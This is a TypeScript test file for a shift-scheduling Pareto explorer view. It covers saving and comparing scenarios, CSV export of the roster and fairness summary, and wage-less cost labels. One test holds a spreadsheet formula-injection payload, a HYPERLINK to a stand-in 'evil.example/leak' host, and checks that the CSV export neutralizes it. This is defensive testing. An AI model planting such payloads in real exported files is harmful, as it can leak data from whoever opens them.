/**
 * Scenario save/compare + CSV export in the Pareto explorer. Both features work
 * entirely off the `SolveResponse` already passed in as `solution` — no new
 * backend calls.
 */
import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { render, screen, cleanup, fireEvent, waitFor } from '@testing-library/react';
import { ParetoExplorerView } from '../ParetoExplorerView';
import { ParetoPoint, SolveResponse } from '../../types';

afterEach(() => {
  cleanup();
  window.localStorage.clear();
  vi.restoreAllMocks();
});

beforeEach(() => {
  window.localStorage.clear();
});

const baseSolution = (overrides: Partial<SolveResponse> = {}): SolveResponse => ({
  instance_name: 'Maple Street Convenience',
  archetype_id: 'convenience_store',
  instance_size_category: 'Small',
  constrainedness_category: 'Medium',
  total_weekly_staffing_hours: 120,
  feasible_work_sequences_count: 10,
  employee_count: 4,
  active_shift_types_count: 3,
  obj_shift: 0,
  obj_shift_min_bound: 0,
  obj_ergo: 5.5,
  obj_ergo_sequential_fixed_sd: 0,
  integrated_ergo_gain_pct: 0,
  solve_time_ms: 10,
  eulerian_valid: true,
  eulerian_cycle_summary: '',
  shift_types: [],
  multigraph_nodes: [],
  multigraph_arcs: [],
  roster_lines: [
    {
      line_number: 1,
      cohort_id: 'A1',
      display_label: 'Line A1',
      assigned_person: 'Jordan Lee',
      assigned_employee_id: 'emp-1',
      qualification_tier: 'Standard',
      hourly_wage: 15,
      current_cycle_week: 1,
      next_week_line_number: 1,
      days: [],
      weekly_hours: 40,
      regular_hours: 40,
      overtime_hours: 0,
      estimated_weekly_payroll: 600,
      work_days_count: 5,
      rest_days_count: 2,
      full_weekend_off: true,
      availability_conflicts_count: 0,
      line_ergo_penalty: 0,
    },
  ],
  interval_coverage: [],
  ergonomics_audit: {
    total_ergo_objective: 5.5,
    sequential_baseline_ergo: 10,
    ergo_improvement_pct: 45,
    health_index_score: 82.3,
    clopening_violations: 1,
    backward_rotation_violations: 0,
    min_rest_hours_observed: 10,
    full_weekends_off_count: 2,
    full_weekends_off_pct: 50,
    consolidated_rest_blocks_pct: 60,
    criteria_breakdown: [],
  },
  pareto_frontier: [],
  labor_analysis: {
    total_scheduled_hours: 120,
    total_regular_hours: 110,
    total_overtime_hours: 10,
    regular_payroll_cost: 1650,
    overtime_payroll_cost: 225,
    total_payroll_cost: 1875,
    avg_hourly_wage: 15,
    hours_per_day: [20, 20, 20, 20, 20, 10, 10],
    cost_per_day: [300, 300, 300, 300, 300, 150, 225],
    overtime_lines_count: 1,
    labor_efficiency_pct: 98,
  },
  employees: [],
  ...overrides,
});

describe('saving and comparing Pareto scenarios', () => {
  it('has nothing saved at first', () => {
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );
    expect(screen.getByText(/No scenarios saved yet/)).toBeTruthy();
  });

  it('pins the currently-displayed solve result under a label and shows its key numbers', async () => {
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );

    fireEvent.change(screen.getByLabelText('Scenario label'), { target: { value: 'Baseline' } });
    fireEvent.click(screen.getByRole('button', { name: 'Save this scenario' }));

    expect(await screen.findByText('Baseline')).toBeTruthy();
    // Key numbers from labor_analysis / ergonomics_audit appear in the comparison row.
    expect(screen.getByText('$1,875')).toBeTruthy();
    expect(screen.getByText('10h')).toBeTruthy();
    expect(screen.getByText('50%')).toBeTruthy();
    expect(await screen.findByText(/Saved "Baseline"/)).toBeTruthy();
  });

  it('defaults the label to the leeway percentage when left blank', async () => {
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={22.5}
        onSelectLeewayPct={() => {}}
      />
    );

    fireEvent.click(screen.getByRole('button', { name: 'Save this scenario' }));

    expect(await screen.findByText('+22.5% leeway')).toBeTruthy();
  });

  it('keeps only up to the max number of scenarios, dropping the oldest', async () => {
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );

    const labelInput = screen.getByLabelText('Scenario label');
    const saveButton = screen.getByRole('button', { name: 'Save this scenario' });

    for (const label of ['One', 'Two', 'Three', 'Four', 'Five']) {
      fireEvent.change(labelInput, { target: { value: label } });
      fireEvent.click(saveButton);
      await waitFor(() => expect(screen.queryByDisplayValue(label)).toBeFalsy());
    }

    expect(screen.queryByText('One')).toBeFalsy();
    expect(screen.getByText('Two')).toBeTruthy();
    expect(screen.getByText('Five')).toBeTruthy();
  });

  it('removes a saved scenario on request', async () => {
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );

    fireEvent.change(screen.getByLabelText('Scenario label'), { target: { value: 'ToRemove' } });
    fireEvent.click(screen.getByRole('button', { name: 'Save this scenario' }));
    await screen.findByText('ToRemove');

    fireEvent.click(screen.getByRole('button', { name: 'Remove' }));

    await waitFor(() => expect(screen.queryByText('ToRemove')).toBeFalsy());
    expect(screen.getByText(/No scenarios saved yet/)).toBeTruthy();
  });

  it('persists saved scenarios to localStorage so they survive a reload', async () => {
    const { unmount } = render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );

    fireEvent.change(screen.getByLabelText('Scenario label'), { target: { value: 'Persisted' } });
    fireEvent.click(screen.getByRole('button', { name: 'Save this scenario' }));
    await screen.findByText('Persisted');
    unmount();

    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );
    expect(await screen.findByText('Persisted')).toBeTruthy();
  });
});

describe('exporting the roster + compliance summary', () => {
  function stubDownload() {
    const createObjectURL = vi.fn().mockReturnValue('blob:mock-url');
    const revokeObjectURL = vi.fn();
    Object.defineProperty(URL, 'createObjectURL', { value: createObjectURL, configurable: true });
    Object.defineProperty(URL, 'revokeObjectURL', { value: revokeObjectURL, configurable: true });
    // jsdom attempts (and fails) to navigate when a real anchor with an href is
    // clicked; the component only uses the click to trigger a download, so that
    // navigation is irrelevant here and we no-op it.
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    return { createObjectURL, revokeObjectURL };
  }

  /** jsdom's Blob can't be read back with Response/.text(), so capture its source parts instead. */
  function captureBlobParts() {
    const parts: string[] = [];
    const OriginalBlob = globalThis.Blob;
    vi.spyOn(globalThis, 'Blob').mockImplementation((blobParts?: BlobPart[], options?: BlobPropertyBag) => {
      parts.push((blobParts || []).join(''));
      return new OriginalBlob(blobParts, options);
    });
    return parts;
  }

  it('downloads a CSV containing the roster and compliance numbers currently on screen', async () => {
    const { createObjectURL } = stubDownload();
    const blobParts = captureBlobParts();
    render(
      <ParetoExplorerView
        solution={baseSolution()}
        selectedLeewayPct={10}
        onSelectLeewayPct={() => {}}
      />
    );

    fireEvent.click(screen.getByRole('button', { name: /Export roster & fairness CSV/ }));

    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
    const text = blobParts[0];

    expect(text).toContain('Jordan Lee');
    expect(text).toContain('Health index score');
    expect(text).toContain('82.3');
    expect(await screen.findByText(/CSV downloaded/)).toBeTruthy();
  });

  it('neutralizes a formula-shaped assigned person name so Excel/Sheets cannot run it on open', async () => {
    const { createObjectURL } = stubDownload();
    const blobParts = captureBlobParts();
    const solution = baseSolution();
    solution.roster_lines[0].assigned_person = '=HYPERLINK("http://evil.example/leak","click")';
    render(
      <ParetoExplorerView solution={solution} selectedLeewayPct={10} onSelectLeewayPct={() => {}} />
    );

    fireEvent.click(screen.getByRole('button', { name: /Export roster & fairness CSV/ }));

    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
    const text = blobParts[0];

    // Quoted, and guarded with a leading single quote inside the quotes - never a raw
    // formula cell a spreadsheet would run on open.
    expect(text).toContain('"\'=HYPERLINK');
    expect(text).not.toMatch(/,=HYPERLINK/);
  });
});

describe('cost axis without wages', () => {
  const point = (i: number, leeway: number, payroll: number): ParetoPoint => ({
    point_index: i,
    leeway_pct: leeway,
    obj_shift: 10 + i,
    obj_ergo: 12 - i,
    ergo_improvement_pct: i * 10,
    employee_count: 5 + i,
    active_shift_types_count: 3,
    total_understaffing_hours: 0,
    total_overstaffing_hours: 0,
    full_weekends_off_pct: 50,
    estimated_weekly_payroll: payroll,
    is_knee_point: false,
    is_selected: i === 0,
    label: `Option ${i}`,
  });

  it('shows staffing level instead of $0 when no wages are entered', () => {
    const solution = baseSolution({ pareto_frontier: [point(0, 0, 0), point(1, 5, 0)] });
    const { container } = render(
      <ParetoExplorerView solution={solution} selectedLeewayPct={0} onSelectLeewayPct={() => {}} />
    );
    expect(screen.getByText(/No wages are entered/)).toBeTruthy();
    expect(container.textContent).toContain('shift patterns');
    expect(container.textContent).not.toMatch(/\$0(?![.\d,])/);
  });

  it('shows dollars when wages are present', () => {
    const solution = baseSolution({ pareto_frontier: [point(0, 0, 1800), point(1, 5, 1900)] });
    const { container } = render(
      <ParetoExplorerView solution={solution} selectedLeewayPct={0} onSelectLeewayPct={() => {}} />
    );
    expect(screen.queryByText(/No wages are entered/)).toBeNull();
    expect(container.textContent).toContain('$1,800');
  });
});
